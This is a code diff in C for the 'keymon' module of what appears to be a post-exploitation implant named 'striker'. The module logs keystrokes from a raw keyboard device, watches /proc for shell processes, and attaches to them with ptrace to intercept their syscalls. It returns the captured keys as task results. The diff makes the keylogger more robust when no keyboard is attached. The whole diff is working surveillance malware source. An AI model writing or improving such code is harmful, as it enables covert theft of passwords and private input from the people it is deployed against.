@@ -161,9 +161,10 @@ void keymon(session *striker, task *tsk){
   size_t count = 0;
   buffer *result_buff = create_buffer(0);
   int kb = open(strs[1], O_RDONLY);
+  unsigned char main_kb_attached = 1;
   if (kb == -1){
     buffer_strcpy(result_buff, strs[2]);
-    goto complete;
+    main_kb_attached = 0;
   }
   fd_set set;
   struct timeval timeout = {1, 0};
@@ -177,23 +178,25 @@ void keymon(session *striker, task *tsk){
   queue_put(km_proc_arg, km_proc_dumps);
   pthread_t tid;
   pthread_create(&tid, NULL, keymon_proc_watch, km_proc_arg);
-
-  while (count < KEYMON_MAX_KEYSTROKES && time(NULL) < end_time){
-    timeout.tv_sec = 1;
-    FD_ZERO(&set);
-    FD_SET(kb, &set);
-    int status = select(kb + 1, &set, NULL, NULL, &timeout);
-    if (status == -1)
-      break;
-    if (status == 0)
-      continue;
-    read(kb, &e, sizeof(e));
-    if (!(e.type == EV_KEY && e.value == 0))
-      continue;
-    keys[count] = e.code;
-    count++;
+  
+  if (main_kb_attached){  
+    while (count < KEYMON_MAX_KEYSTROKES && time(NULL) < end_time){
+      timeout.tv_sec = 1;
+      FD_ZERO(&set);
+      FD_SET(kb, &set);
+      int status = select(kb + 1, &set, NULL, NULL, &timeout);
+      if (status == -1)
+        break;
+      if (status == 0)
+        continue;
+      read(kb, &e, sizeof(e));
+      if (!(e.type == EV_KEY && e.value == 0))
+        continue;
+      keys[count] = e.code;
+      count++;
+    }
+    close(kb);
   }
-  close(kb);
 
   printf("[*] keymon: waiting for proc watcher...\n");
   pthread_join(tid, NULL);
@@ -217,21 +220,20 @@ void keymon(session *striker, task *tsk){
     free(pid);
   }
   queue_free(km_proc_dumps, 0);
-
-  complete:
-    cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(tsk->uid));
-    if (count > 0){
-      cJSON *keys_logged = cJSON_CreateArray();
-      for (int i = 0; i < count; i++)
-        cJSON_AddItemToArray(keys_logged, cJSON_CreateNumber(keys[i]));
-      cJSON_AddItemToObject(tsk->result, strs[6], keys_logged);
-    }else{
-      char *res = buffer_to_string(result_buff);
-      cJSON_AddItemToObject(tsk->result, strs[5], cJSON_CreateString(res));
-    }
-    tsk->completed = 1;
-    free(keys);
-    free_buffer(result_buff);
+  
+  cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(tsk->uid));
+  if (count > 0){
+    cJSON *main_kb_keys = cJSON_CreateArray();
+    for (int i = 0; i < count; i++)
+      cJSON_AddItemToArray(main_kb_keys, cJSON_CreateNumber(keys[i]));
+    cJSON_AddItemToObject(tsk->result, strs[6], main_kb_keys);
+  }else{
+    char *res = buffer_to_string(result_buff);
+    cJSON_AddItemToObject(tsk->result, strs[5], cJSON_CreateString(res));
+  }
+  tsk->completed = 1;
+  free(keys);
+  free_buffer(result_buff);
 }
 
 void *keymon_proc_watch(void *ptr){
@@ -276,25 +278,36 @@ void *keymon_proc_watch(void *ptr){
           free(pid);
           continue;
         }
+        printf("[+] Processing process: %d\n", *pid);
+        // /proc/<pid>/cmdline file separates executable and args with null bytes, so we need this form of matching to seperate shell sessions from script invocations like: /bin/bash script.sh
         char *filename = malloc(50);
+        memset(filename, 0, 50);
         snprintf(filename, 50, strs[1], *pid);
-        FILE *rfo = fopen(filename, "r");
-        if (!rfo){
-          free(filename);
-          free(pid);
+        int fd = open(filename, O_RDONLY);
+        if (fd == -1){
+          free(filename); free(pid);
           continue;
         }
-        fgets(filename, 50, rfo);
+        char *proc_name = malloc(50);
+        memset(proc_name, 0, 50);
+        int n = read(fd, proc_name, 50);
+        if (n == 0 || n == -1){
+          close(fd); free(filename); free(proc_name); free(pid);
+          printf("[-] Unable to read!\n");
+          continue;
+        }
+        char *buff = malloc(50);
         int valid = 0;
         for (int i = 0; i < 7; i++){
-          if (!strcmp(targets[i], filename)){
+          memset(buff, 0, 50);
+          strncpy(buff, targets[i], strlen(targets[i]));
+          if (!memcmp(buff, proc_name, 50)){
             valid = 1;
             break;
           }
         }
+        close(fd); free(filename); free(proc_name); free(buff);
         if (!valid){
-          fclose(rfo);
-          free(filename);
           free(pid);
           continue;
         }
@@ -325,7 +338,6 @@ void *keymon_proc_attach(void *ptr){
   session *striker = queue_get(q);
   time_t *end_time = queue_get(q);
   pid_t *pid = queue_get(q);
-  int status;
   struct user_regs_struct regs;
   printf("[*] Attaching to PID: %d\n", *pid);
   if (ptrace(PTRACE_ATTACH, *pid, NULL, NULL))
@@ -334,7 +346,13 @@ void *keymon_proc_attach(void *ptr){
   ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
   while (striker->abort == 0 && queue_full(q) == 0 && time(NULL) < *end_time){
     ptrace(PTRACE_SYSCALL, *pid, 0, 0);
-    waitpid(*pid, &status, 0);
+    int status = -47;
+    while (status == -47){
+      waitpid(*pid, &status, WNOHANG);
+      usleep(1000);
+      if (striker->abort || time(NULL) >= *end_time)
+        goto complete;
+    }
     if (WIFEXITED(status))
       break;
     ptrace(PTRACE_GETREGS, *pid, 0, &regs);
@@ -349,10 +367,11 @@ void *keymon_proc_attach(void *ptr){
       }
     }
   }
-  printf("[+] %d closing...\n", *pid);
-  ptrace(PTRACE_DETACH, *pid, NULL, NULL);
-  printf("[+] %d closed!\n", *pid);
-  pthread_exit(NULL);
+  complete:
+    printf("[+] %d closing...\n", *pid);
+    ptrace(PTRACE_DETACH, *pid, NULL, NULL);
+    printf("[+] %d closed!\n", *pid);
+    pthread_exit(NULL);
 }
 
 task *parse_task(cJSON *json){
